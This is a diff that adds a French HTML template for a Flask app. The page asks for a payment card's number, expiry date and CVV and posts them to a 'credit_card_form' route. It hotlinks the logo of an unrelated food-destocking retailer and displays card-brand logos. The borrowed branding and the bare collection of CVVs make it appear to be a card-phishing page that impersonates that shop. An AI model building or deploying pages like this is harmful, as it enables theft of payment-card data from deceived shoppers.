@@ -1,0 +1,192 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Informations de la Carte de Crédit</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            background-color: #f0f0f0;
+            margin: 0;
+            padding: 0;
+            position: relative;
+        }
+
+        .top-right-image {
+            position: absolute;
+            top: 10px;
+            right: 10px;
+            width: 50px;
+            height: 50px;
+            background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAADAAAAAwCAYAAABXAvmHAAAAAXNSR0IArs4c6QAABAtJREFUaEPtmFnIVVUUx3+mDfTSQBKNZkEQhVhokIaVVETlg0E0UA85UTlQNhCFPRQoGmWTWQ/NUUEQQkVJihUZVhYJ0aDRICmVGSUSZWrtn6wDm+u533cP5/iZcPbLvXfvtfde///677XW9w1iHx+D9nH/aQHs7Qi2EWgjUJOBVkI1Cay9vY1AbQprHtBGoCaBtbe3EeiDwsHAKcCZwBnAjNp0lxxQNQI6dSDwZw/OXAs8F3b/AAf0sKeySa8A7gQuAEYBM4FnerjpfwXgW2B4OD0JeLoHAOcClwAfAh8B63vYU9kkj4B6PR04FtgKfJlYXwlsA75LrJ8Qp98PvBXz7wPjY/6v5PDH4fTfwCfAabH2L7AcGA0cEnOrksROBM4DtgNLgW+6IDgVOCfk+xXwduzZ9QfNQcHolSWbV8elOYDC7GfgeEBnHer8XeD8AD8XeD7WdgBDgpAxMfdOOFWQKIh7gXsyPw5OdzyVzruiw7fPgYkCdvN9ifFbuyBfA4wEvk8gh3XYdALIl41efwC6yWUK8GQsvhqOltmuA0YIYANwdFgomVeAI1NIzwIODVnlAGT5a2BLYv2uLAIeoVSUkQCW9RMBJfcs4OdUQLYdG0Ou4+IM57S5LdYWpHNPCtvpAvg906UHTgt9azMU2NQRgckRVtdNjYWE/H1zAv1gHH5NPwAeSnffFLZXAS9mNJ8NeM91MfdoZD9/Kh0j41gugNeAS7PNvwIvJ+cXAT4Yxw+hd7/3BWBCSrWv9whAoAJ2WF82Z0ReD9yoRGL9M0DJOEwCF8b3TQLwIb6RZYwCiw/PCx7ZQwDyCHinD9Ns47g9GD8uI7bs6/YiA+yf2DYLKR/Dl4MwFZriBNpkBCRmVnbXLyFZp26INVM7w3f6UwmCbQI4JgyKdR/PipTO9osJH9jdKTMUbEwHHou1zjdQRUK5rs3xptViWFvsnS6LiZeAq8tCIAB1/iPwZmQPC9niDICaV0pFUfoi8rW6NWPlj7gKABmdFwlDgo4KB3+LYqrzL8Sc2c0CuiQynT5eZK8lAFPiyV20ZkV2bU6ENTcrqwNVAHST9x3A/Ch8RmVsH+9gggB8wBeXGKk705hl+/D4tC0uRl0ARl3WjaRjZ7rnYeCW+O7cYcDjwOWw279BrRe7ADissnaavoc/Iu9/EO1B4bAX2Sb4sKwdNmgWrByUvYz7HYIuGkAl8GlHK2EafSJ6KdsI2V7bhW3PMRJHpLdhmre5tEnc0Ws73UcUKy1Z6YteaGGq5rMr7S4x3psAHgi51MIw0ADei/5K+dmp2lfVGgMNwIJp293YGGgAjTleHNQCaJzSige2EahIWOPmbQQap7TigW0EKhLWuHkbgcYprXhgG4GKhDVu/h8UAu3I51OcfQAAAABJRU5ErkJggg==');
+            background-size: cover;
+        }
+
+        .logo {
+            text-align: center;
+            margin-top: 10px;
+        }
+
+        .container {
+            width: 50%;
+            margin: 0 auto;
+            background-color: #fff;
+            padding: 20px;
+            box-shadow: 0px 0px 10px rgba(0, 0, 0, 0.1);
+            margin-top: 50px;
+            text-align: center;
+        }
+
+        h1 {
+            color: #333;
+        }
+
+        label {
+            display: block;
+            margin: 10px 0;
+            text-align: left;
+            font-weight: bold;
+        }
+
+        input[type="text"], input[type="number"] {
+            width: 100%;
+            padding: 10px;
+            margin: 5px 0;
+            border: 1px solid #ccc;
+            border-radius: 5px;
+            box-sizing: border-box;
+        }
+
+        button {
+            background-color: #4CAF50;
+            color: white;
+            padding: 10px 20px;
+            border: none;
+            border-radius: 5px;
+            cursor: pointer;
+            font-size: 16px;
+        }
+
+        button:hover {
+            background-color: #45a049;
+        }
+
+        .loading {
+            display: none;
+            text-align: center;
+            margin-top: 20px;
+        }
+
+        .spinner {
+            border: 8px solid #f3f3f3;
+            border-top: 8px solid #3498db;
+            border-radius: 50%;
+            width: 50px;
+            height: 50px;
+            animation: spin 2s linear infinite;
+            margin: 10px auto;
+        }
+
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+
+        /* Styles pour les logos des cartes */
+        .card-logos {
+            display: flex;
+            justify-content: flex-start;
+            gap: 10px;
+            margin-top: 5px;
+        }
+
+        .card-logos img {
+            width: 40px;
+            height: auto;
+        }
+    </style>
+    <script>
+        document.addEventListener('DOMContentLoaded', function() {
+            const dateExpirationInput = document.getElementById('date_expiration');
+            const numeroCarteInput = document.getElementById('numero_carte');
+            const cvvInput = document.getElementById('cvv');
+            const form = document.querySelector('form');
+            const loadingDiv = document.getElementById('loading');
+
+            dateExpirationInput.addEventListener('input', function(e) {
+                let value = e.target.value.replace(/\D/g, '');
+                if (value.length > 2) {
+                    value = value.slice(0, 2) + '/' + value.slice(2, 4);
+                }
+                if (value.length > 5) {
+                    value = value.slice(0, 5);
+                }
+                e.target.value = value;
+            });
+
+            numeroCarteInput.addEventListener('input', function(e) {
+                let value = e.target.value.replace(/\D/g, '');
+                if (value.length > 4) {
+                    value = value.slice(0, 4) + ' ' + value.slice(4);
+                }
+                if (value.length > 9) {
+                    value = value.slice(0, 9) + ' ' + value.slice(9);
+                }
+                if (value.length > 14) {
+                    value = value.slice(0, 14) + ' ' + value.slice(14);
+                }
+                if (value.length > 19) {
+                    value = value.slice(0, 19);
+                }
+                e.target.value = value;
+            });
+
+            cvvInput.addEventListener('input', function(e) {
+                let value = e.target.value.replace(/\D/g, '');
+                if (value.length > 3) {
+                    value = value.slice(0, 3);
+                }
+                e.target.value = value;
+            });
+
+            form.addEventListener('submit', function(event) {
+                loadingDiv.style.display = 'block';
+            });
+        });
+    </script>
+</head>
+<body>
+
+    <!-- Logo centré en haut -->
+    <div class="logo">
+        <img src="https://destockagealimentaireprixbas.com/wp-content/uploads/2024/04/Destockage-Alimentaire-2.gif" alt="Destockage Alimentaire" style="width: 200px;">
+    </div>
+
+    <div class="top-right-image"></div>
+
+    <div class="container">
+        <h1>Informations de la Carte de Crédit</h1>
+        <form method="POST" action="{{ url_for('credit_card_form') }}">
+            <label for="numero_carte">Numéro de la carte :</label>
+            <input type="text" id="numero_carte" name="numero_carte" required maxlength="19" placeholder="xxxx xxxx xxxx xxxx">
+            <!-- Logos des cartes -->
+            <div class="card-logos">
+                <img src="https://upload.wikimedia.org/wikipedia/commons/5/5e/Visa_Inc._logo.svg" alt="Visa">
+                <img src="https://upload.wikimedia.org/wikipedia/commons/2/2a/Mastercard-logo.svg" alt="Mastercard">
+                <img src="https://upload.wikimedia.org/wikipedia/commons/3/30/American_Express_logo.svg" alt="American Express">
+            </div>
+            <label for="date_expiration">Date d'expiration :</label>
+            <input type="text" id="date_expiration" name="date_expiration" required maxlength="5" placeholder="MM/AA">
+            <label for="cvv">Code de sécurité (CVV) :</label>
+            <input type="number" id="cvv" name="cvv" required maxlength="3" placeholder="CVV">
+            <button type="submit">Envoyer</button>
+        </form>
+        <div class="loading" id="loading">
+            <div class="spinner"></div>
+            <p>Envoi en cours...</p>
+        </div>
+    </div>
+
+</body>
+</html>
